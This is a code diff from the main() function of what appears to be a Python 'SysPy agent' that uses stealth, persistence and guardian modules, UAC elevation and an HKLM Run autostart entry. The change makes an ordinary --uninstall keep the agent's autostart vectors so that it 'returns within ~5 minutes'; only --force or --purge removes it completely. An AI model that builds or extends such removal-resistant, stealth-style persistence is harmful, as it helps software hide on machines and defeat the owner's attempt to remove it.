@@ -351,22 +351,28 @@ def main(argv: list[str] | None = None) -> int:
             print(f"{'OK  ' if os.path.exists(candidate) else 'MISS'} {candidate}")
         return 0
 
-    hard = ("--force" in argv) or ("--purge" in argv) or not config.protected()
-
     if "--uninstall" in argv or "--remove" in argv or "--purge" in argv:
-        if stealth.IS_WINDOWS and not stealth.is_admin() and os.environ.get("SYSPY_NO_UAC") != "1" and "--no-elevate" not in argv:
-            print("[*] Requesting Administrator privileges to stop services and remove files...")
+        hard = ("--purge" in argv) or ("--force" in argv)
+
+        # Elevation happens HERE, in the same block, so --purge gets it too.
+        # purge() needs admin for guardian.remove() and the HKLM Run value.
+        # Putting this after the block silently degrades --purge to user-level.
+        if (stealth.IS_WINDOWS and not stealth.is_admin()
+                and os.environ.get("SYSPY_NO_UAC") != "1"
+                and "--no-elevate" not in argv):
+            print("[*] requesting Administrator privileges...")
             if stealth.elevate_process(argv, wait=True):
-                print("[+] Uninstallation completed successfully.")
+                print("[+] done.")
                 return 0
-            print("[!] Elevation was declined or failed. Proceeding with user-level removal.")
-        print("Removing SysPy agent and persistence...")
+            print("[!] elevation declined - continuing user-level.")
+
+        print("Removing SysPy agent...")
         actions = persistence.purge() if hard else persistence.remove(keep_anchor=True)
         for action in actions:
             print(f"  [x] {action}")
         if not hard:
-            print("  [i] anchor kept - the agent will return within 5 minutes.")
-            print("      use --uninstall --force to remove it completely.")
+            print("  [i] autostart vectors kept - the agent returns within ~5 minutes.")
+            print("      agent.py --uninstall --force   removes it completely.")
         print("Done.")
         return 0
 
